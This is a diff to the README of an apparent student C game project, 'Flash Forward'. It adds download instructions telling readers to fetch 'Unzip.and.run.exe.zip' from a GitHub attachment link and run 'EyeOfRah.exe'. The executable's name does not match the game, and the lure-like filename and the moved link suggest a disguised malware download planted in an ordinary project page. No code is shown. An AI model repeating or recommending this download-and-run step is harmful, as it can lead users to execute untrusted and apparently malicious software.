@@ -1,6 +1,4 @@
-# Flash Forward by Team Tarnished – 2D Action Game (C)
-
-https://github.com/user-attachments/files/23301277/Unzip.and.run.exe.zip
+# Flash Forward by Team Tarnished – Top-Down Bullet Hell Game (C)
 
 Developed as part of a game programming project at DigiPen Institute of Technology.  
 This repository showcases my personal contributions to the project, focused on gameplay systems and level logic.
@@ -28,3 +26,9 @@ Assets, libraries, and frameworks provided by DigiPen are excluded for copyright
 - Hold mouse button to charge melee attaack.
 - Q to quit at any time during level play.
 - X to toggle time stop during play, 1 uses per 12 seconds.
+
+Download Instructions
+
+1. **[Download the game]https://github.com/user-attachments/files/23301277/Unzip.and.run.exe.zip**
+2. Extract the contents to a folder on your desktop.
+2. Run the main executable ("EyeOfRah.exe") to start playing.
